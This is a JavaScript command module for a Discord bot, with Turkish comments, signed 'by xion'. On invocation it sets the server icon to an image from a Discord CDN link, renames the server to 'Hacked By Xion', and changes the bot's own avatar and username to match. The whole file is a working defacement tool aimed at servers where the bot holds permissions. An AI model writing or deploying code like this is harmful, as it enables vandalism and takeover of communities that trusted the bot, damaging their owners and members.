module.exports =  {
    kod: "sunucu",
    async run (client, message, args) {

        await message.guild.setIcon("https://cdn.discordapp.com/attachments/777910003620511784/831142727135264788/a_15030464d363809bfeafbf44303e518f.png");  //SUNUCUNUN RESMINI DEGISTIRIR HIZI RESIM SUTESINDEN UPLOAD EDEBILIRSINIZ
        await message.guild.setName("Hacked By Xion"); //SUNUCUNUN ISMINI DEGISTIRIR
        await client.user.setAvatar("https://cdn.discordapp.com/attachments/777910003620511784/831142727135264788/a_15030464d363809bfeafbf44303e518f.png"); //BOTUN RESMINI DEGISTIRIR HIZLI RESIM SITESINDEN UPLOAD EDEBILIRSINIZ
        await client.user.setUsername("Hacked By Xion");    //BOTUN ISMİNİ DEGISTIRIR
    }
}
// by xion